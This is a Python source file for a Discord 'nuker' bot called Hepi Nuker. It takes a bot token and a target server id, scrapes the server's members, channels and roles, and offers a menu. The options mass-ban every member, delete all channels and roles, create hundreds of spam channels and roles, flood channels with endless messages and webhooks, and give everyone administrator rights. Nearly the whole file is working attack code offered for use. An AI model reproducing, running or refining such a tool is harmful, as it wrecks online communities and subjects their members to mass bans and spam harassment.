try:
  import os
  import json
  import string
  import requests
  import threading
  import time
  import discord
  from discord.ext import commands
  from colorama import Fore,Style,Back
  from datetime import timedelta
  import random
  import sys
except:
  print("couldn't import all required packages, try again later.")
  exit()

print(f'''
{Fore.RED}
██╗░░██╗███████╗██████╗░██╗
██║░░██║██╔════╝██╔══██╗██║
███████║█████╗░░██████╔╝██║
██╔══██║██╔══╝░░██╔═══╝░██║
██║░░██║███████╗██║░░░░░██║
╚═╝░░╚═╝╚══════╝╚═╝░░░░░╚═╝{Fore.RED}
▒ ░░   ░░ ▒░ ░░ ▒▓ ░▒▓░░ ▒░ 
    ░     ░ ░  ░  ░▒ ░ ▒░░  
  ░         ░     ░░   ░ ░    
            ░  ░   ░     

{Fore.RESET}{Fore.YELLOW}
███╗░░██╗██╗░░░██╗██╗░░██╗███████╗██████╗░
████╗░██║██║░░░██║██║░██╔╝██╔════╝██╔══██╗
██╔██╗██║██║░░░██║█████═╝░█████╗░░██████╔╝
██║╚████║██║░░░██║██╔═██╗░██╔══╝░░██╔══██╗
██║░╚███║╚██████╔╝██║░╚██╗███████╗██║░░██║
╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
{Fore.RESET}
''')

with open('setup.json') as f:
  setup = json.load(f)

token = setup.get("bot").get("token")
bot_status = setup.get("bot").get("bot_status")
scname = setup.get("channel_spam_name")
rcname = setup.get("role_spam_name")
spam_msg = setup.get("spam_message")
scamount = setup.get("channel_spam_amount")
rcamount = setup.get("role_spam_amount")
hookspam = setup.get("webhook_spam")

if scamount > 500:
  print(Fore.RED+"The channel spam amount must be 500 or lower.")
  exit()
if rcamount > 250:
  print(Fore.RED+"The role spam amount must be 250 or lower.")
  exit()

try:
  members = open('members.hepi')
except:
  with open('members.hepi', 'w') as f:
    f.write("")
  members = open('members.hepi')

try:
  channels = open('channels.hepi')
except:
  with open('channels.hepi', 'w') as f:
    f.write("")
  channels = open('channels.hepi')

try:
  roles = open('roles.hepi')
except:
  with open('roles.hepi', 'w') as f:
    f.write("")
  roles = open('roles.hepi')

x = open('members.hepi', 'w')
x.close()
y = open('channels.hepi', 'w')
y.close()
z = open('roles.hepi', 'w')
z.close()

bot = commands.Bot(command_prefix='?', intents=discord.Intents.all())
headers = {'authorization':"Bot "+token}
me = json.loads(requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers).text)

class hepi:
  __version__ = "3.2.0++"
  __author__ = "DaredeviL"

print(f"Token: {Fore.YELLOW}{token}{Fore.RESET}\nBot: {Fore.CYAN}{me['username']}#{me['discriminator']}{Fore.RESET}\nBot invite URL:\n{Fore.BLUE}https://discord.com/oauth2/authorize?client_id={me['id']}&scope=bot&permissions=8{Fore.RESET}\n\nVersion {Fore.MAGENTA}{hepi.__version__}{Fore.RESET}, made by {Fore.YELLOW}{hepi.__author__}{Fore.RESET}.\n")
guild = input("server id to nuke\n>")

spinList = ["|","/","-","\\"]
for x in spinList+spinList+spinList:
  sys.stdout.write("\rstarting nuker "+x)
  sys.stdout.flush()
  time.sleep(0.1)

if guild.isnumeric() is False:
  print(f"{Fore.RED}The id must be a number.")
  exit()
else:
  serverid = int(guild)

def randomString(chars):
  return f"{''.join(random.choices(string.ascii_letters + string.digits, k=chars))}"

def main():
  try:
    bot.run(token)
  except Exception as e:
    if "improper token has" in str(e).lower():
      print(f"{Fore.RED}an improper bot token has been passed.")
    elif "our rate limits freq" in str(e).lower():
      print(f"{Fore.RED}You are being rate limited, please try again later.")
    elif "intents" in str(e).lower():
      print(f"{Fore.RED} Enable all intents.")

def createhook(channel):
  try:
    json = {'name': 'Wizzed'}
    r = requests.post(f'https://discord.com/api/v8/channels/{channel}/webhooks',headers=headers,json=json)
    return f"https://discord.com/api/webhooks/{r.json()['id']}/{r.json()['token']}"
  except:
    pass


def sendhook(webhook):
  try:
    while True:
      json={'username': randomString(20),'content':spam_msg}
      requests.post(webhook,json=json)
      try:
        print(f"{Fore.YELLOW}Webhook Spam message sent.{Fore.RESET}")
      except:
        pass
  except:
    pass

def dchannels(cid):
  while True:
    r = requests.delete(f"https://discord.com/api/v8/channels/{cid}", headers=headers)
    print(f"{Fore.RED}Channel deleted{Fore.YELLOW}[{cid}]{Fore.RESET}")
    if 'retry_after' in r.text:
      print(f"Ratelimited, you can try again in: {timedelta(int(r.json()['retry_after']))}.")
    else:
      break

def droles(rid):
  while True:
    r = requests.delete(f"https://discord.com/api/v8/guilds/{guild}/roles/{rid}", headers=headers)
    print(f"{Fore.RED}role deleted{Fore.YELLOW}[{rid}]{Fore.RESET}")
    if 'retry_after' in r.text:
      print(f"Ratelimited, you can try again in:{timedelta(int(r.json()['retry_after']))}.")
    else:
      break

def sroles(name):
  while True:
    json = {'name': name, 'type': 0}
    r = requests.post(f"https://discord.com/api/v9/guilds/{guild}/roles", headers=headers, json=json)
    print(f"{Fore.GREEN}role created.{Fore.RESET}")
    if 'retry_after' in r.text:
      print(f"Ratelimited, you can try again in:{timedelta(int(r.json()['retry_after']))}.")
    else:
      break

def massb(user):
  while True:
    r = requests.put(f"https://discord.com/api/v8/guilds/{guild}/bans/{user}", headers=headers)
    print(f"{Fore.RED}member banned{Fore.YELLOW}[{guild}]{Fore.RESET}")
    if 'retry_after' in r.text:
      print(f"Ratelimited, you can try again in:{timedelta(int(r.json()['retry_after']))}.")
    else:
      break

def spammer(channel):
  while True:
    json = {'content': spam_msg}
    requests.post(f"https://discord.com/api/v8/channels/{channel}/messages", headers=headers, json=json)
    try:
      print(f"{Fore.YELLOW}Spam message sent{Fore.RESET}")
    except:
      pass

def schannels(name):
  while True:
    json = {'name': name,'type': 0}
    r = requests.post(f"https://discord.com/api/v9/guilds/{guild}/channels", headers=headers, json=json)
    print(f"{Fore.GREEN}channel created{Fore.RESET}")
    if hookspam:
      webhook = createhook(r.json()['id'])
      f = threading.Thread(target=sendhook, args=(webhook,))
      f.start()
    else:
      f = threading.Thread(target=spammer, args=(r.json()['id'],))
      f.start()
    if 'retry_after' in r.text:
      print(f"Ratelimited, you can try again in:{timedelta(int(r.json()['retry_after']))}.")
    else:
      break

ballvar = []
channvar = []

def wizz():
  print(Fore.RESET)
  print(f"Banall will start shortly...")
  startball = time.time()
  for i in range(0, 50):
    for m in members:
      x = threading.Thread(target=massb, args=(m,))
      x.start()
      ballvar.append(x)
  for thread in ballvar:
    thread.join()
  endball = time.time()
  print(f"Banall complete, time took: {endball - startball}")
  print("channel del will start shortly...")
  startchdel = time.time()
  for i in range(50):
    for c in channels:
      y = threading.Thread(target=dchannels, args=(c,))
      y.start()
      channvar.append(y)
  for threadx in channvar:
    threadx.join()
  endchdel = time.time()
  print(f"channel del complete, time took: {endchdel - startchdel}")
  for fr in range(scamount):
    tr = threading.Thread(target=schannels, args=(scname,))
    tr.start()

def clear():
  os.system('clear')

@bot.event
async def on_ready():
  await bot.change_presence(activity=discord.Game(name=bot_status))
  clear()
  id = bot.get_guild(serverid)
  if id is None:
    print(f"{Fore.RED}Server not found.")
    exit()
  cdata = open('channels.hepi','a')
  print("Getting channels...")
  with cdata as x:
    for channel in id.channels:
      x.write(f"{channel.id}\n")
  print("Getting roles...")
  rdata = open('roles.hepi', 'a')
  with rdata as g:
    for role in id.roles:
      g.write(f"{role.id}\n")
  mdata = open('members.hepi', 'a')
  print("getting members...")
  with mdata as f:
    for member in id.members:
      f.write(f"{member.id}\n")
  print(Fore.GREEN+"Server has been scraped!"+Fore.RESET)
  print("starting nuke menu...")
  time.sleep(2)
  clear()
  print(Fore.RED + f'''

{Fore.RED}
██╗░░██╗███████╗██████╗░██╗
██║░░██║██╔════╝██╔══██╗██║
███████║█████╗░░██████╔╝██║
██╔══██║██╔══╝░░██╔═══╝░██║
██║░░██║███████╗██║░░░░░██║
╚═╝░░╚═╝╚══════╝╚═╝░░░░░╚═╝{Fore.RED}
▒ ░░   ░░ ▒░ ░░ ▒▓ ░▒▓░░ ▒░ 
    ░     ░ ░  ░  ░▒ ░ ▒░░  
  ░         ░     ░░   ░ ░    
            ░  ░   ░     

{Fore.RESET}{Fore.YELLOW}
███╗░░██╗██╗░░░██╗██╗░░██╗███████╗██████╗░
████╗░██║██║░░░██║██║░██╔╝██╔════╝██╔══██╗
██╔██╗██║██║░░░██║█████═╝░█████╗░░██████╔╝
██║╚████║██║░░░██║██╔═██╗░██╔══╝░░██╔══██╗
██║░╚███║╚██████╔╝██║░╚██╗███████╗██║░░██║
╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝

{Fore.RESET}
{Back.BLUE}-----{Fore.WHITE}Server info{Fore.RESET}-----{Back.RESET}

Name: {Fore.BLUE}{id.name}{Fore.RESET}
MemberCount: {Fore.GREEN}{len(id.members)}{Fore.RESET}
Channels: {Fore.CYAN}{len(id.channels)}{Fore.RESET}
Roles: {Fore.RED}{len(id.roles)}{Fore.RESET}
Owner: {Fore.YELLOW}{id.owner}{Fore.RESET}

{Back.WHITE}-----{Fore.BLACK}Nuke Options{Fore.RESET}-----{Back.RESET}

(1) {Fore.RED}Wizz{Fore.RESET}
(2) {Fore.YELLOW}Delete all channels{Fore.RESET}
(3) {Fore.GREEN}\033[96mSpam channels{Fore.RESET}
(4) {Fore.MAGENTA}banall{Fore.RESET}
(5) {Fore.CYAN}delete all roles{Fore.RESET}
(6) {Fore.GREEN}{Style.DIM}spam roles{Style.RESET_ALL}{Fore.RESET}
(7) {Style.DIM}admin for everyone{Style.RESET_ALL}
(8) \033[93mflood a channel with webhooks
''' + Fore.RESET)
  while True:
    option = input(">")
    if option == "1":
      wizz()
    elif option == "2":
      be4 = time.time()
      for c in channels:
        y = threading.Thread(target=dchannels, args=(c,))
        y.start()
      print(f"ChannelDel complete, time took: {time.time()-be4}")
    elif option == "3":
      be4 = time.time()
      for fr in range(scamount):
        tr = threading.Thread(target=schannels, args=(scname,))
        tr.start()
      print(f"channelSpam complete, time took: {time.time()-be4}")
    elif option == "4":
      be4 = time.time()
      for m in members:
        x = threading.Thread(target=massb, args=(m,))
        x.start()
      print(f"banall complete, time took: {time.time()-be4}")
    elif option == "5":
      be4 = time.time()
      for r in roles:
        z = threading.Thread(target=droles, args=(r,))
        z.start()
      print(f"roleDel complete, time took: {time.time()-be4}")
    elif option == "6":
      for hh in range(rcamount):
        res = threading.Thread(target=sroles, args=(rcname,))
        res.start()
    elif option == "7":
      perm = discord.Permissions()
      perm.update(administrator = True)
      await id.default_role.edit(permissions=perm)
      print(f"{Fore.GREEN}{len(id.members)} members has been given the admin permission!{Fore.RESET}")
    elif option == "8":
      intput = int(input("Channel id to flood\n>"))
      if bot.get_channel(intput) == None:
        print(f"{Fore.RED}channel not found.")
      else:
        webhook = createhook(intput)
        f = threading.Thread(target=sendhook, args=(webhook,))
        f.start()

if __name__ == '__main__':
  main()
